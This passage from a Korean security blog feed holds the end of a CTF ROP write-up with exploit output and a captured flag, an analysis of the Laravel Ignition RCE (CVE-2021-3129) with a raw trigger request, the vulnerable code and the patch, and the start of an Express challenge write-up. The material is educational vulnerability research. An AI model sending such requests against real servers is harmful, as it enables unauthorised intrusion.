&#39;&#x2F;home&#x2F;pocas&#x2F;pwn&#x2F;HackCTF&#x2F;rOP&#x2F;rop&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] write@plt : 0x8048340</span><br><span class="line">[*] write@got : 0x804a018</span><br><span class="line">[*] read@plt : 0x8048310</span><br><span class="line">[*] read@got : 0x804a00c</span><br><span class="line">[*] libc_base addr : 0xf7dbb000</span><br><span class="line">[*] system addr : 0xf7df5940</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;4bcd3fg7ijPlmA4pqrtuvxza2cdef&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{4bcd3fg7ijPlmA4pqrtuvxza2cdef}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3129 RCE in Laravel Debug mode</title>
      <link href="2021/01/25/2021-01-25-CVE-2021-3129/"/>
      <url>2021/01/25/2021-01-25-CVE-2021-3129/</url>
      
        <content type="html"><![CDATA[<p>Laravel Debug mode에서 발견된 CVE-2021-3129 취약점을 분석해보겠습니다. Laravel은 자유/오픈 소스 PHP 웹 프레임워크 중 하나라고 합니다. 해당 취약점은 보안 연구원이 Laravel을 기반으로 한 웹 사이트에서 취약점 진단을 하다가 디버그 모드에서 발견했다고 합니다. 해당 사이트는 전체적으로 안전했지만 웹 프레임워크 취약점을 이용해서 RCE를 트리거 했습니다.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2021-3129</td><td>laravel &lt;= 8.4.2 and Ignition &lt;= 2.5.1</td><td>9.8</td></tr></tbody></table><p><br>CVE-2021-3129는 Laravel의 &lt;= V8.4.2 DEBUG MODE에서 모두 발생한다고 합니다. 2020년 11월 16일에 POC를 전달해주었고, 바로 다음 날 패치 버전을 발표했다고 합니다.<br></p><hr><h2 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a><em>CVE-2021-3129</em></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 141.164.52.207:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;141.164.52.207:8888&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;&#x2F;work&#x2F;pentest&#x2F;laravel&#x2F;laravel&#x2F;resources&#x2F;views&#x2F;hello.blade.php&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 요청은 username이라는 변수로 템플릿을 생성해주는 로직의 요청 헤더 값이고, solution의 값은 <code>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>, viewFile의 값은 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>인 것을 볼 수 있습니다. 하지만 solution, viewFile의 값은 임의의 값으로 수정이 가능합니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Requests</span>\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Validation</span>\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>컨트롤러를 확인해봅시다. <code>ExecuteSolutionController</code> 클래스를 확인해 보면 run() 메서드를 실행하고, 인자 값으로는 parameters를 넘겨주는 것을 볼 수 있습니다. run() 메서드는 <code>MakeViewVariableOptionalSolution::run()</code>에 정의되어 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Solutions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">RunnableSolution</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Blade</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 요청 헤더에서 sollution이 가르키는 <code>MakeViewVariableOptionalSolution</code> 클래스를 보면 run() 메서드에서 makeOptional() 메서드를 호출하는 것을 볼 수 있고, makeOptional() 메서드에 값으로 $parameters를 그대로 넘겨주고 있는 것을 볼 수 있습니다. (Facade\Ignition\Solutions\MakeViewVariableOptionalSolution)<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">    <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makeOptional() 메서드를 보면 file_get_contents() 메서드를 호출하는 데 이때 입력값인 <code>viewFile</code>(임의의 값을 넣어줄 수 있음)를 넘겨주고 있는 것을 볼 수 있습니다. 그리고 <code>$originalContents</code>에서 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;]</code>을 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;</code>로 replace 시키고, 2개의 값을 이용해서 토큰 2개를 생성하는 것을 볼 수 있습니다. 그리고 생성된 두개의 토큰이 다르 false를 반환하고, 같은 $newContents를 반환하는 것을 볼 수 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$newContents가 리턴이 되었다면 $newContents의 값을 file_put_contents() 메서드를 이용해서 $parameters[‘viewFile’]로 값을 넣어 파일을 생성하고 . 감이 오셨나요? 여기서 file_get_contents(), file_put_contents() 메서드의 인자값에 대한 검증이 존재하지 않아 우리가 원하는 값을 마음대로 삽입할 수 있습니다.<br><br></p><p>연구원은 이를 이용해서 PHP Wrapper을 이용해 log 파일을 체이닝 시켜, 마지막에 phar Wrapper를 이용해서 역직렬화 RCE를 트리거 하였습니다. log 파일을 체이닝 할 때는 base64, utf-8, utf-16 등을 이용해서 체이닝을 해준 것으로 보입니다.<br></p><hr><h2 id="CVE-2021-3129-Patch"><a href="#CVE-2021-3129-Patch" class="headerlink" title="CVE-2021-3129 Patch"></a><em>CVE-2021-3129 Patch</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ignition-2.5.2/ignition-2.5.2/src/Solutions/MakeViewVariableOptionalSolution.php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;isSafePath(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CVE-2021-3129 Patch 노트가 따로 존재하지 않아 패치 버전인 Ignition 2.5.2의 코드를 직접 확인해보았습니다. <code>makeOptional()</code> 메서드를 보면 기존에는 존재하지 않던 <code>$parameters[&#39;viewFile&#39;]</code>의 값을 <code>isSafePath()</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSafePath()</code> 메서드를 보면 ‘/‘, ‘./‘로 시작하지 않거나, 마지막에 .blade.php가 아니면 false를 리턴하는 것을 볼 수 있습니다. 위 2개의 검증 로직이 추가되므로 항상 viewFile의 값이 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>일 때 정상 작동하게 되었고, 개발자가 의도하지 않은 값이 <code>viewFile</code>로 들어오게 되면 아무 일도 일어나지 않게 되며 CVE-2021-3129 취약점을 패치하였습니다.<br></p><p>매번 느끼지만 PHP에서는 끊임 없이 취약점이 나오고 있네요. 앞으로도 PHP를 사용하고 있는 웹 프레임워크나 여러 프로그램에서 취약점이 더 수두룩 나올 거 같습니다.<br></p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express Challenge Write Up (Gynvael Coldwind)</title>
      <link href="2021/01/24/2021-01-24-express-challenge/"/>
      <url>2021/01/24/2021-01-24-express-challenge/</url>
      
        <content type="html"><![CDATA[<p><strong>트위터에서 Gynvael Coldwind라는 분이 만든 Express Challenge 입니다.</strong><br></p><hr><h3 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span 